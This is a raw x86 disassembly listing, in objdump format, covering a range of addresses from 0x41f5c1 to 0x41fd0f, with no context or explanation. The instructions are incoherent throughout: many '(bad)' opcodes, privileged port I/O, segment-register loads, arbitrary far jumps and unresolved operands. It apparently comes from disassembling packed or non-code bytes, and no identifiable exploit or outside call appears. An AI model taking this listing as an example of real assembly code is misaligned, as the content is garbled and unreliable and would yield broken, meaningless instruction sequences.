  41f5c1:	adc    DWORD PTR [edx],esp
  41f5c3:	mov    bl,0x74
  41f5c5:	(bad)  
  41f5c6:	and    eax,0x803853f2
  41f5cb:	sbb    BYTE PTR [ecx+ebx*1-0x173b87bd],bl
  41f5d2:	mov    ah,0xb
  41f5d4:	xor    dl,BYTE PTR [edi-0x25fe086d]
  41f5da:	out    0x47,eax
  41f5dc:	add    edi,DWORD PTR [edi]
  41f5de:	rol    ah,0xb3
  41f5e1:	aam    0xcc
  41f5e3:	neg    BYTE PTR [ebx-0x1b7c428f]
  41f5e9:	shl    DWORD PTR ds:0x85b50776,0xeb
  41f5f0:	push   esi
  41f5f1:	int3   
  41f5f2:	push   0xdcd3e709
  41f5f7:	sub    DWORD PTR [ebp+0x619f4d12],ecx
  41f5fd:	cmp    ebx,DWORD PTR [eax]
  41f5ff:	cmc    
  41f600:	pop    ds
  41f601:	mov    ds:0xd9f810b6,eax
  41f606:	repz cmp BYTE PTR [ecx+0x69],al
  41f60a:	add    BYTE PTR ds:0x6299999b,dl
  41f610:	inc    esp
  41f611:	mov    bh,0xea
  41f613:	push   esi
  41f614:	test   eax,0xf6be6d29
  41f619:	jae    0x41f63b
  41f61b:	add    edx,DWORD PTR [edx]
  41f61d:	daa    
  41f61e:	(bad)  [eax]
  41f620:	jns    0x41f66a
  41f622:	in     al,dx
  41f623:	lds    ebp,FWORD PTR [ebx+eiz*2]
  41f626:	aad    0x8e
  41f628:	pushf  
  41f629:	mov    ?,WORD PTR [esi]
  41f62b:	cmp    BYTE PTR [edi+esi*4+0x2b],0x34
  41f630:	scas   al,BYTE PTR es:[edi]
  41f631:	mov    dh,0x98
  41f633:	adc    dh,cl
  41f635:	(bad)  
  41f636:	push   esp
  41f637:	ffree  st(0)
  41f639:	pop    ecx
  41f63a:	into   
  41f63b:	xor    ebx,esp
  41f63d:	add    BYTE PTR [edx],0x72
  41f640:	imul   ebp,DWORD PTR [edi],0x5777b5fd
  41f646:	(bad)  
  41f647:	stos   DWORD PTR es:[edi],eax
  41f648:	icebp  
  41f649:	mov    ch,0x7a
  41f64b:	sbb    ah,dh
  41f64d:	lds    esp,FWORD PTR cs:[edi+eiz*8]
  41f651:	ja     0x41f671
  41f653:	jecxz  0x41f6ac
  41f655:	jnp    0x41f69a
  41f657:	mov    cl,0xef
  41f659:	rcr    BYTE PTR [edi+0x21],0x3
  41f65d:	xchg   BYTE PTR [eax],dl
  41f65f:	test   BYTE PTR cs:[edi],0x63
  41f663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f664:	pop    ecx
  41f665:	cmp    edi,esi
  41f667:	push   esp
  41f668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f669:	jne    0x41f6d4
  41f66b:	outs   dx,BYTE PTR ds:[esi]
  41f66c:	(bad)  
  41f66d:	(bad)  
  41f66e:	pop    edx
  41f66f:	outs   dx,DWORD PTR ds:[esi]
  41f670:	test   eax,0x41f3052
  41f675:	cmp    eax,0xc82465ff
  41f67a:	sbb    ecx,DWORD PTR [esi-0x2b]
  41f67d:	add    dh,BYTE PTR [eax-0x2d6ca224]
  41f683:	push   esi
  41f684:	aaa    
  41f685:	xchg   esp,eax
  41f686:	test   eax,0x9223f51b
  41f68b:	xor    dh,bh
  41f68d:	ret    
  41f68e:	pop    ebx
  41f68f:	shl    DWORD PTR [ebx+0x11],cl
  41f692:	push   esp
  41f693:	cmp    BYTE PTR [edi-0x30dea46],bl
  41f699:	out    0x34,al
  41f69b:	mov    esp,DWORD PTR [eax]
  41f69d:	dec    ecx
  41f69e:	mov    ch,0x10
  41f6a0:	sbb    edx,edx
  41f6a2:	outs   dx,DWORD PTR ds:[esi]
  41f6a3:	dec    ecx
  41f6a4:	mov    cl,0x68
  41f6a6:	shl    BYTE PTR [edi-0x1127f4b5],cl
  41f6ac:	test   eax,0x109226f7
  41f6b1:	sbb    BYTE PTR [eax-0x65],bh
  41f6b4:	ins    DWORD PTR es:[edi],dx
  41f6b5:	cmp    ebx,esi
  41f6b7:	mov    ds:0xbc64a3d6,al
  41f6bc:	(bad)  
  41f6bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6be:	rcl    DWORD PTR [eax+0x8],0xfa
  41f6c2:	sahf   
  41f6c3:	xor    eax,0xb79c0cdc
  41f6c8:	in     al,dx
  41f6c9:	mov    bl,bl
  41f6cb:	push   ecx
  41f6cc:	and    eax,edi
  41f6ce:	xchg   ebp,eax
  41f6cf:	cmp    eax,0x40741929
  41f6d4:	icebp  
  41f6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6d6:	lods   eax,DWORD PTR ds:[esi]
  41f6d7:	mov    edi,0x2d92cdcf
  41f6dc:	pcmpgtw mm6,QWORD PTR [eax-0x2f322848]
  41f6e3:	div    ebx
  41f6e5:	dec    BYTE PTR [eax+0x2ed461a2]
  41f6eb:	das    
  41f6ec:	jge    0x41f742
  41f6ee:	sbb    eax,0x5195f9e0
  41f6f3:	xchg   edi,eax
  41f6f4:	jmp    0x41f71f
  41f6f6:	repz cmp esi,0x5b
  41f6fa:	cdq    
  41f6fb:	cld    
  41f6fc:	cli    
  41f6fd:	mov    al,ds:0x1d57e430
  41f702:	dec    edx
  41f703:	leave  
  41f704:	push   ss
  41f705:	ss mov dl,0x57
  41f708:	add    eax,0x59826385
  41f70d:	cmp    al,0x73
  41f70f:	pop    ss
  41f710:	(bad)  
  41f711:	mov    eax,DWORD PTR [ebx+0x5d9fb7e8]
  41f717:	mov    ds:0x82c0657a,eax
  41f71c:	cmp    eax,0x949113f3
  41f721:	push   edx
  41f722:	ds (bad) 
  41f725:	push   ebp
  41f726:	aad    0xb7
  41f728:	push   ss
  41f729:	sbb    DWORD PTR [ebx+ebp*2-0x65],esp
  41f72d:	jecxz  0x41f778
  41f72f:	lea    edi,fs:[eax+0x4e6a5213]
  41f736:	gs dec ebp
  41f738:	(bad)  
  41f739:	sbb    ah,BYTE PTR [esi-0x16]
  41f73c:	cdq    
  41f73d:	ja     0x41f705
  41f73f:	dec    eax
  41f740:	aaa    
  41f741:	xchg   edx,eax
  41f742:	retf   
  41f743:	aad    0x7a
  41f745:	and    dl,BYTE PTR [eax-0x16a1f44e]
  41f74b:	dec    eax
  41f74c:	fcomp  st(2)
  41f74e:	jmp    0x4a2f:0x9915b09c
  41f755:	icebp  
  41f756:	xchg   DWORD PTR [ebx],ecx
  41f758:	mov    ecx,DWORD PTR [edi-0x52]
  41f75b:	lock and eax,0x9f2c8f88
  41f761:	push   edx
  41f762:	xor    DWORD PTR [eax],ebx
  41f764:	jmp    0x978d700
  41f769:	in     eax,0xc3
  41f76b:	call   ebx
  41f76d:	xor    BYTE PTR [ebp+0x4c7bd432],cl
  41f773:	xchg   ebx,eax
  41f774:	cli    
  41f775:	pop    esi
  41f776:	push   ds
  41f777:	jnp    0x41f7b1
  41f779:	aas    
  41f77a:	mov    ds,WORD PTR [eax-0x4db54dab]
  41f780:	push   edx
  41f781:	stos   DWORD PTR es:[edi],eax
  41f782:	neg    DWORD PTR [ebx+0x17]
  41f785:	mov    dl,0x8
  41f787:	sbb    BYTE PTR [edi-0x6d],0xde
  41f78b:	mov    edi,eax
  41f78d:	mov    ch,0x9b
  41f78f:	push   ecx
  41f790:	inc    ecx
  41f791:	shr    BYTE PTR [edi-0xf8d80b7],0x0
  41f798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f799:	sub    eax,0xaeeaf619
  41f79e:	pop    esp
  41f79f:	or     bl,BYTE PTR [ecx-0xb]
  41f7a2:	std    
  41f7a3:	sub    eax,0x9d6bd06c
  41f7a8:	dec    ebx
  41f7a9:	aas    
  41f7aa:	mov    ebx,0xb29aedf
  41f7af:	outs   dx,DWORD PTR ds:[esi]
  41f7b0:	stos   BYTE PTR es:[edi],al
  41f7b1:	fisttp DWORD PTR [edx+0x75]
  41f7b4:	cmp    al,0x6f
  41f7b6:	mov    esp,0x69828e62
  41f7bb:	daa    
  41f7bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7bd:	cwde   
  41f7be:	test   BYTE PTR [edx+0x553207f6],0xd1
  41f7c5:	push   0xffffffc5
  41f7c7:	clc    
  41f7c8:	call   0x9355:0xe248bfa0
  41f7cf:	push   es
  41f7d0:	add    eax,0x6fc3827c
  41f7d5:	jns    0x41f7e3
  41f7d7:	sub    bl,BYTE PTR [ecx]
  41f7d9:	test   edi,edi
  41f7db:	lods   al,BYTE PTR ds:[esi]
  41f7dc:	cdq    
  41f7dd:	test   DWORD PTR [esp+eax*4],0xf63ff578
  41f7e4:	dec    eax
  41f7e5:	sti    
  41f7e6:	mov    ch,0xd9
  41f7e8:	loop   0x41f864
  41f7ea:	js     0x41f826
  41f7ec:	retf   
  41f7ed:	cmp    al,0xee
  41f7ef:	mov    ah,0xe8
  41f7f1:	push   esi
  41f7f2:	jecxz  0x41f799
  41f7f4:	cld    
  41f7f5:	inc    ecx
  41f7f6:	(bad)  
  41f7f7:	jg     0x41f7eb
  41f7f9:	repnz mov cl,0xf7
  41f7fc:	out    dx,eax
  41f7fd:	imul   edi,DWORD PTR [edi],0xbe5b8686
  41f803:	mov    eax,0x7b995a95
  41f808:	mov    dl,BYTE PTR [eax]
  41f80a:	mov    cl,0x76
  41f80c:	adc    dl,0x9
  41f80f:	stos   DWORD PTR es:[edi],eax
  41f810:	inc    esi
  41f811:	mov    al,BYTE PTR [esi-0x68]
  41f814:	fs mov dl,0x81
  41f817:	inc    ebp
  41f818:	inc    edx
  41f819:	retf   0xe4b0
  41f81c:	adc    DWORD PTR [eax],edi
  41f81e:	cmp    DWORD PTR [eax+0x69609c23],edi
  41f824:	std    
  41f825:	xchg   ebx,eax
  41f826:	xor    ebx,DWORD PTR [ecx-0x373a465]
  41f82c:	push   ebx
  41f82d:	jne    0x41f853
  41f82f:	ja     0x41f7ca
  41f831:	loope  0x41f7cb
  41f833:	les    eax,FWORD PTR [esi+0x7c3cbae5]
  41f839:	mov    gs,WORD PTR [edi+0x6]
  41f83c:	dec    esp
  41f83d:	dec    edi
  41f83e:	mov    ds:0xcc4e64e8,eax
  41f843:	push   esi
  41f844:	retf   0xfd44
  41f847:	fidivr DWORD PTR [ecx-0x2d]
  41f84a:	mov    dh,BYTE PTR [ebx]
  41f84c:	push   eax
  41f84d:	mov    esi,DWORD PTR [esi]
  41f84f:	lds    eax,FWORD PTR [ebp+0x5c217649]
  41f855:	jl     0x41f866
  41f857:	xchg   edi,eax
  41f858:	adc    ch,BYTE PTR [eax-0x62]
  41f85b:	xlat   BYTE PTR ds:[ebx]
  41f85c:	lods   al,BYTE PTR ds:[esi]
  41f85d:	xor    BYTE PTR [esi-0x4d],bl
  41f860:	hlt    
  41f861:	xor    BYTE PTR [edi],bh
  41f863:	sub    al,0x86
  41f865:	ja     0x41f843
  41f867:	jl     0x41f846
  41f869:	add    ch,BYTE PTR [edi+0x43]
  41f86c:	mov    cl,dh
  41f86e:	idiv   al
  41f870:	or     edi,DWORD PTR [edx-0x62]
  41f873:	mov    ds:0x613ff019,eax
  41f878:	(bad)  [edi]
  41f87a:	and    BYTE PTR [ebx+0x51d0a116],cl
  41f880:	les    ecx,FWORD PTR [ecx+0x3d]
  41f883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f884:	sbb    BYTE PTR [edx],bh
  41f886:	nop
  41f887:	dec    eax
  41f888:	outs   dx,BYTE PTR ds:[esi]
  41f889:	lods   eax,DWORD PTR ds:[esi]
  41f88a:	(bad)  
  41f88b:	dec    DWORD PTR [esi+0x1b424ad9]
  41f891:	js     0x41f89c
  41f893:	test   al,0x6c
  41f895:	repnz add eax,0xca3ea286
  41f89b:	stos   DWORD PTR es:[edi],eax
  41f89c:	shl    BYTE PTR [ebp-0x2878823c],cl
  41f8a2:	push   ebx
  41f8a3:	lods   eax,DWORD PTR ds:[esi]
  41f8a4:	data16 (bad) 
  41f8a6:	sub    BYTE PTR ds:0x2957d234,cl
  41f8ac:	mov    bh,0x2f
  41f8ae:	aas    
  41f8af:	add    BYTE PTR [ebp-0x42],0xe7
  41f8b3:	and    eax,0x6046237d
  41f8b8:	dec    ecx
  41f8b9:	in     al,dx
  41f8ba:	xor    DWORD PTR [bp+si],0x13
  41f8be:	je     0x41f8da
  41f8c0:	in     eax,dx
  41f8c1:	mov    al,ds:0x13f6dca3
  41f8c6:	std    
  41f8c7:	jle    0x41f8f2
  41f8c9:	inc    ecx
  41f8ca:	enter  0x28f4,0x25
  41f8ce:	das    
  41f8cf:	or     dh,BYTE PTR [eax+ecx*2-0x135857d]
  41f8d6:	sti    
  41f8d7:	xchg   edx,eax
  41f8d8:	popf   
  41f8d9:	push   esi
  41f8da:	sub    bl,BYTE PTR [esp+eax*4]
  41f8dd:	mov    dl,0x52
  41f8df:	sbb    al,0x77
  41f8e1:	sub    esp,DWORD PTR [ebp+0x3a]
  41f8e4:	push   ebp
  41f8e5:	add    eax,0x68730c8a
  41f8ea:	xor    eax,0x5d259d05
  41f8ef:	dec    eax
  41f8f0:	lea    eax,[ebx-0x5863c3f6]
  41f8f6:	push   ds
  41f8f7:	add    eax,0xf052ce8b
  41f8fc:	jbe    0x41f8f8
  41f8fe:	jno    0x41f8fc
  41f900:	scas   eax,DWORD PTR es:[edi]
  41f901:	loope  0x41f92d
  41f903:	cli    
  41f904:	xor    BYTE PTR [edi],dl
  41f906:	adc    ecx,DWORD PTR [esi+0x48]
  41f909:	jl     0x41f980
  41f90b:	or     DWORD PTR [edi+0x13],0xffffff9e
  41f90f:	jecxz  0x41f95d
  41f911:	les    esp,FWORD PTR ds:0x95d4f1f3
  41f917:	pop    ebp
  41f918:	ins    BYTE PTR es:[edi],dx
  41f919:	stos   DWORD PTR es:[edi],eax
  41f91a:	jae    0x41f987
  41f91c:	sahf   
  41f91d:	jmp    0x41f8e1
  41f91f:	push   0x39ac9263
  41f924:	jo     0x41f8f3
  41f926:	(bad)  
  41f928:	shl    DWORD PTR [ebx-0x689aded9],1
  41f92e:	out    dx,eax
  41f92f:	jns    0x41f997
  41f931:	lock xchg DWORD PTR [ebx-0x19],edi
  41f935:	add    eax,0xa208f325
  41f93a:	or     eax,0x33eed9ef
  41f93f:	push   0xffffffb7
  41f941:	add    edx,ebx
  41f943:	jnp    0x41f906
  41f945:	xchg   esi,eax
  41f946:	mov    cl,0x6a
  41f948:	outs   dx,BYTE PTR ds:[esi]
  41f949:	ret    
  41f94a:	data16 aas 
  41f94c:	scas   eax,DWORD PTR es:[edi]
  41f94d:	adc    dh,BYTE PTR [edi]
  41f94f:	or     DWORD PTR [esi-0x3aea19c1],esi
  41f955:	and    BYTE PTR ds:0x993e5248,al
  41f95b:	inc    esp
  41f95c:	call   0x976b70ae
  41f961:	leave  
  41f962:	adc    BYTE PTR [ebx],dh
  41f964:	int    0x70
  41f966:	sar    DWORD PTR [ecx],0x9c
  41f969:	rcr    DWORD PTR [esi+0x1c],0xf0
  41f96d:	add    edi,DWORD PTR ds:0xe8735a17
  41f973:	sbb    al,0xdb
  41f975:	(bad)  
  41f976:	retf   
  41f977:	scas   al,BYTE PTR es:[edi]
  41f978:	aam    0xb0
  41f97a:	(bad)  
  41f97b:	xchg   DWORD PTR [edi-0x50],eax
  41f97e:	clts   
  41f980:	cmp    bh,BYTE PTR [edi]
  41f982:	in     al,dx
  41f983:	pop    esp
  41f984:	bound  ebx,QWORD PTR [eax]
  41f986:	fisttp WORD PTR [ebp-0xebad90a]
  41f98c:	sub    eax,0x72cee7f6
  41f991:	mov    eax,0xff3b7d4f
  41f996:	and    al,BYTE PTR ds:0x6cb0218f
  41f99c:	jg     0x41f9cf
  41f99e:	pop    ecx
  41f99f:	jae    0x41f9e0
  41f9a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9a2:	add    BYTE PTR ds:0x667a9175,0xf9
  41f9a9:	lock sahf 
  41f9ab:	ds push eax
  41f9ad:	and    al,0x99
  41f9af:	call   0x9717:0x3c1e5740
  41f9b6:	xor    eax,0xc2828980
  41f9bb:	cmc    
  41f9bc:	mov    bl,bl
  41f9be:	pop    ebx
  41f9bf:	cmp    eax,0x99c86c8d
  41f9c4:	sub    ah,BYTE PTR [eax-0x4d9196ad]
  41f9ca:	and    al,0x68
  41f9cc:	int    0x91
  41f9ce:	sbb    dl,dl
  41f9d0:	mov    esp,DWORD PTR [edx-0xa5b1a63]
  41f9d6:	clc    
  41f9d7:	lahf   
  41f9d8:	in     al,0x88
  41f9da:	and    ch,dh
  41f9dc:	or     esp,DWORD PTR [eax*4+0x245b5f06]
  41f9e3:	(bad)  
  41f9e4:	xlat   BYTE PTR ds:[ebx]
  41f9e5:	loope  0x41fa29
  41f9e7:	push   edi
  41f9e8:	(bad)  
  41f9e9:	std    
  41f9ea:	(bad)  
  41f9ec:	fdiv   QWORD PTR [edi-0x14]
  41f9ef:	mov    esi,DWORD PTR [esi-0x401df1e8]
  41f9f5:	push   eax
  41f9f6:	dec    eax
  41f9f7:	and    al,0x72
  41f9f9:	mov    eax,0x1f443ebc
  41f9fe:	rcl    DWORD PTR [edi-0x39],1
  41fa01:	push   eax
  41fa02:	dec    esp
  41fa03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa04:	inc    edi
  41fa05:	jg     0x41f99b
  41fa07:	sti    
  41fa08:	enter  0xbebf,0x8f
  41fa0c:	xchg   esi,eax
  41fa0d:	enter  0x6464,0x33
  41fa11:	shl    BYTE PTR [esi-0x62],cl
  41fa14:	push   0x34
  41fa16:	popa   
  41fa17:	inc    esp
  41fa18:	lock pop ebp
  41fa1a:	xchg   ecx,eax
  41fa1b:	jns    0x41fa0c
  41fa1d:	cmp    cl,ch
  41fa1f:	lock or eax,DWORD PTR [ecx]
  41fa22:	mov    ds:0x8907da9e,al
  41fa27:	push   ds
  41fa28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa29:	cmp    dh,BYTE PTR [ebp-0x1f]
  41fa2c:	iret   
  41fa2d:	gs scas al,BYTE PTR es:[edi]
  41fa2f:	rcr    DWORD PTR [edi+0x4f1c8fd7],cl
  41fa35:	retf   
  41fa36:	ja     0x41f9e3
  41fa38:	dec    edi
  41fa39:	lods   al,BYTE PTR ds:[esi]
  41fa3a:	(bad)  
  41fa3b:	stos   DWORD PTR es:[edi],eax
  41fa3c:	out    0x53,al
  41fa3e:	mov    edx,0x7128db11
  41fa43:	xor    al,0xf0
  41fa45:	adc    al,0x9b
  41fa47:	in     al,0xc
  41fa49:	leave  
  41fa4a:	out    0x9d,eax
  41fa4c:	jae    0x41faa0
  41fa4e:	loopne 0x41fa0f
  41fa50:	rcr    DWORD PTR [ebp+0x16],cl
  41fa53:	mov    al,0x11
  41fa55:	sub    eax,0x394b9b66
  41fa5a:	jge    0x41faad
  41fa5c:	dec    eax
  41fa5d:	ret    
  41fa5e:	push   0x9170db45
  41fa63:	scas   al,BYTE PTR es:[edi]
  41fa64:	cmp    al,0x8d
  41fa66:	mov    ecx,0x9f51390d
  41fa6b:	ins    DWORD PTR es:[edi],dx
  41fa6c:	test   eax,0x6285dc8f
  41fa71:	outs   dx,DWORD PTR ds:[esi]
  41fa72:	bound  eax,QWORD PTR [esi+0x58]
  41fa75:	fdivp  st(6),st
  41fa77:	cmp    eax,0xcf1afd5f
  41fa7c:	out    dx,al
  41fa7d:	add    esi,DWORD PTR [ebp-0x13]
  41fa80:	mov    dl,0xe3
  41fa82:	arpl   sp,sp
  41fa84:	mov    dh,0x1d
  41fa86:	mov    ebp,0xdda2c11f
  41fa8b:	dec    BYTE PTR [ecx-0x2ccc4885]
  41fa91:	pushf  
  41fa92:	cli    
  41fa93:	in     al,dx
  41fa94:	cli    
  41fa95:	dec    esp
  41fa96:	mov    BYTE PTR [ecx+0x5b],ah
  41fa99:	pop    esi
  41fa9a:	xor    al,0x58
  41fa9c:	jbe    0x41fa3c
  41fa9e:	xor    bl,ch
  41faa0:	push   ss
  41faa1:	pushf  
  41faa2:	adc    eax,0x5f23a7a6
  41faa7:	sub    edi,ecx
  41faa9:	loope  0x41fab1
  41faab:	dec    ebp
  41faac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faad:	inc    edi
  41faae:	pusha  
  41faaf:	mov    cl,0x2
  41fab1:	pushf  
  41fab2:	cmp    al,0x30
  41fab4:	imul   esp,DWORD PTR [eax+0x7c],0x131578e1
  41fabb:	pushf  
  41fabc:	cmp    dl,ah
  41fabe:	add    ecx,ebp
  41fac0:	pop    ecx
  41fac1:	xor    eax,0xb6bfdbb5
  41fac6:	bnd je 0x41fb32
  41fac9:	sbb    edx,DWORD PTR [edi+edi*8+0x39]
  41facd:	mov    edx,0x1f2d78b7
  41fad2:	idiv   DWORD PTR [eax]
  41fad4:	mov    bh,0x93
  41fad6:	aaa    
  41fad7:	test   ch,ah
  41fad9:	mov    dl,0x15
  41fadc:	shr    DWORD PTR [ebx],0xa
  41fadf:	ins    BYTE PTR es:[edi],dx
  41fae0:	mov    ebp,0xc927c7c2
  41fae5:	in     al,dx
  41fae6:	sti    
  41fae7:	aad    0x5b
  41fae9:	daa    
  41faea:	mov    gs,WORD PTR [ebp-0x1b]
  41faed:	push   edx
  41faee:	adc    ebx,DWORD PTR [ecx+ecx*2]
  41faf1:	cmp    BYTE PTR [edi],cl
  41faf3:	dec    eax
  41faf4:	mov    edx,0x31a93044
  41faf9:	add    DWORD PTR [edx-0x7e0cb3b0],edx
  41faff:	jp     0x41fa87
  41fb01:	(bad)  
  41fb02:	mov    edi,0x2529b006
  41fb07:	int    0x29
  41fb09:	mov    ecx,0x6d2ac9b
  41fb0e:	enter  0x6276,0x7f
  41fb12:	into   
  41fb13:	repz add ch,0xab
  41fb17:	(bad)  
  41fb18:	aam    0x73
  41fb1a:	sbb    al,0x45
  41fb1c:	imul   edx,eax,0xffffffad
  41fb1f:	inc    edi
  41fb20:	ficomp DWORD PTR [esp+ebp*1]
  41fb23:	clc    
  41fb24:	aad    0x54
  41fb26:	adc    eax,0x63e43bcd
  41fb2b:	lea    eax,[esi+0x1b]
  41fb2e:	adc    eax,DWORD PTR [ebx]
  41fb30:	inc    DWORD PTR [esi]
  41fb32:	ins    BYTE PTR es:[edi],dx
  41fb33:	mov    eax,ds:0x6a01c1b
  41fb38:	sar    DWORD PTR ds:0xf8b81408,cl
  41fb3e:	xor    al,0x44
  41fb40:	ds push edx
  41fb42:	popf   
  41fb43:	xor    DWORD PTR [ecx],edi
  41fb45:	retf   
  41fb46:	sub    ebx,DWORD PTR ds:0xfcc3d8e9
  41fb4c:	js     0x41fb39
  41fb4e:	popa   
  41fb4f:	rcr    DWORD PTR [ebp+ebx*1+0x429b7115],0x7c
  41fb57:	fdivr  QWORD PTR [edi]
  41fb59:	or     al,bl
  41fb5b:	cmp    eax,esp
  41fb5d:	pop    ebp
  41fb5e:	cmp    edx,DWORD PTR [eax-0x37]
  41fb61:	adc    ebx,DWORD PTR ds:0x6740c7ef
  41fb67:	adc    eax,0x66924725
  41fb6c:	mov    ecx,DWORD PTR [edx]
  41fb6e:	mov    ebx,ebp
  41fb70:	or     bh,BYTE PTR [edi-0x5381228e]
  41fb76:	sar    ebx,cl
  41fb78:	das    
  41fb79:	xlat   BYTE PTR ds:[ebx]
  41fb7a:	push   ss
  41fb7b:	adc    ebx,esi
  41fb7d:	and    edi,DWORD PTR [edi]
  41fb7f:	pop    ebx
  41fb80:	inc    ecx
  41fb81:	enter  0xf7c4,0xa3
  41fb85:	leave  
  41fb86:	dec    ecx
  41fb87:	push   ecx
  41fb88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb89:	stc    
  41fb8a:	fwait
  41fb8b:	mov    esp,0xbd28fcb4
  41fb90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb91:	mov    ?,edx
  41fb93:	add    DWORD PTR [esi],edi
  41fb95:	iret   
  41fb96:	adc    DWORD PTR [ebp-0x5bd53ad5],ecx
  41fb9c:	jbe    0x41fbb7
  41fb9e:	gs pop ss
  41fba0:	lea    ecx,[ebp+0xa]
  41fba3:	and    al,0xd8
  41fba5:	imul   ecx,DWORD PTR [ebx+0x73d884a6],0x21
  41fbac:	dec    esp
  41fbad:	clc    
  41fbae:	xor    DWORD PTR [esp+edx*2-0x73],esi
  41fbb2:	sbb    eax,DWORD PTR es:[edx]
  41fbb5:	pop    ebx
  41fbb6:	fld    TBYTE PTR [ebx]
  41fbb8:	sbb    DWORD PTR [ecx+0x4dbe2ad],esi
  41fbbe:	and    eax,0xceccc02d
  41fbc3:	js     0x41fc0f
  41fbc5:	inc    eax
  41fbc6:	dec    esp
  41fbc7:	repz or al,0x43
  41fbca:	sahf   
  41fbcb:	lahf   
  41fbcc:	xchg   esi,eax
  41fbcd:	fnstsw WORD PTR [esi+0x63eb6ebc]
  41fbd3:	cli    
  41fbd4:	jmp    0xfbff:0x457153e5
  41fbdb:	sub    BYTE PTR [eax-0x6dc6275d],0xf4
  41fbe2:	ret    
  41fbe3:	dec    ebp
  41fbe4:	adc    BYTE PTR [edi-0x22bf5189],cl
  41fbea:	inc    edi
  41fbeb:	sbb    al,0x71
  41fbed:	cmp    ebx,DWORD PTR [ecx+0x2daa66e3]
  41fbf3:	adc    eax,0xaead4612
  41fbf8:	dec    ebx
  41fbf9:	fdiv   st(0),st
  41fbfb:	and    al,0x7d
  41fbfd:	iret   
  41fbfe:	and    BYTE PTR [esi],bh
  41fc00:	xor    DWORD PTR [esi+0x5d931659],ebp
  41fc06:	mov    ds:0x284417f6,al
  41fc0b:	test   DWORD PTR ds:0x497972cd,ecx
  41fc11:	dec    eax
  41fc12:	call   0x50a4:0xf95
  41fc18:	les    eax,FWORD PTR [esi]
  41fc1a:	pushf  
  41fc1b:	fs jo  0x41fbcd
  41fc1e:	push   edx
  41fc1f:	(bad)  
  41fc20:	jle    0x41fc7c
  41fc22:	int3   
  41fc23:	(bad)  
  41fc24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc25:	mul    ebp
  41fc27:	and    al,0x8f
  41fc29:	add    esi,ebx
  41fc2b:	dec    ebx
  41fc2c:	or     DWORD PTR ds:0x34fb5193,esi
  41fc32:	xchg   edx,eax
  41fc33:	xor    al,0xce
  41fc35:	iret   
  41fc36:	or     eax,0xdf0284c0
  41fc3b:	mov    cs,WORD PTR [ebp+edx*8-0x25ab5bb1]
  41fc42:	and    DWORD PTR [edi],edi
  41fc44:	stc    
  41fc45:	bound  esi,QWORD PTR [eax-0x5a]
  41fc48:	loope  0x41fbe5
  41fc4a:	repz div DWORD PTR [eax-0x90a0bc0]
  41fc51:	push   cs
  41fc52:	imul   esp,DWORD PTR [ebp+edi*1-0x57],0xb05c6caa
  41fc5a:	adc    al,0x2e
  41fc5c:	cmc    
  41fc5d:	(bad)  
  41fc5e:	push   ebx
  41fc5f:	dec    ecx
  41fc60:	pop    esp
  41fc61:	cmp    esp,DWORD PTR [ebp+0x281050b3]
  41fc67:	test   al,0x9d
  41fc69:	scas   eax,DWORD PTR es:[edi]
  41fc6a:	popf   
  41fc6b:	dec    esp
  41fc6c:	push   esp
  41fc6d:	sub    DWORD PTR [eax-0x7f],esi
  41fc70:	lds    edi,FWORD PTR [ecx+0x33]
  41fc73:	(bad)  
  41fc74:	nop
  41fc75:	dec    ecx
  41fc76:	adc    eax,0x3bdb26e
  41fc7b:	dec    ecx
  41fc7c:	test   eax,0x5aae108c
  41fc81:	addr16 mov ds:0xbd28,eax
  41fc85:	enter  0x7fda,0xa0
  41fc89:	fcom   QWORD PTR [edi-0x17]
  41fc8c:	and    ecx,DWORD PTR [edx+0x70]
  41fc8f:	daa    
  41fc90:	mov    eax,0x52bbb64b
  41fc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc96:	sbb    BYTE PTR [esi],ch
  41fc98:	shr    DWORD PTR [esp-0x19],cl
  41fc9c:	cmp    eax,0xd3e14ef3
  41fca1:	mov    dl,0xe8
  41fca3:	scas   al,BYTE PTR es:[edi]
  41fca4:	xchg   ecx,eax
  41fca5:	xchg   esp,eax
  41fca6:	xor    DWORD PTR [ebp-0x5d095088],ebp
  41fcac:	sbb    DWORD PTR [ebx+ebp*2+0x15ff542f],0x7b53f57a
  41fcb7:	mov    al,0xf3
  41fcb9:	push   ds
  41fcba:	sub    al,0xea
  41fcbc:	lds    edx,FWORD PTR [ebp+0x5c]
  41fcbf:	xlat   BYTE PTR ds:[ebx]
  41fcc0:	and    dh,BYTE PTR cs:[ecx+0x2b]
  41fcc4:	mov    ebp,0x18c8307
  41fcc9:	data16 loopne 0x41fc72
  41fccc:	cld    
  41fccd:	(bad)  
  41fcce:	in     eax,dx
  41fccf:	mov    al,0xe9
  41fcd1:	sub    eax,0xb679e277
  41fcd6:	mov    esp,0xddc35caa
  41fcdb:	(bad)  
  41fcdc:	in     al,0x36
  41fcde:	mov    eax,0xa36eaeca
  41fce3:	mov    ?,WORD PTR [ecx+0x756f6fe0]
  41fce9:	push   ss
  41fcea:	and    BYTE PTR [edx+0x69],cl
  41fced:	xchg   esi,eax
  41fcee:	rol    DWORD PTR [esi-0x2],cl
  41fcf1:	sub    al,0x7e
  41fcf3:	fneni(8087 only) 
  41fcf5:	xchg   ecx,eax
  41fcf6:	cmp    DWORD PTR [eax-0x1027ed3f],0x84439716
  41fd00:	inc    ebp
  41fd01:	and    BYTE PTR [ecx-0x58],bh
  41fd04:	icebp  
  41fd05:	loop   0x41fceb
  41fd07:	inc    esp
  41fd08:	enter  0x61c8,0xff
  41fd0c:	test   BYTE PTR [edx+0x32],ch
  41fd0f:	push   cs
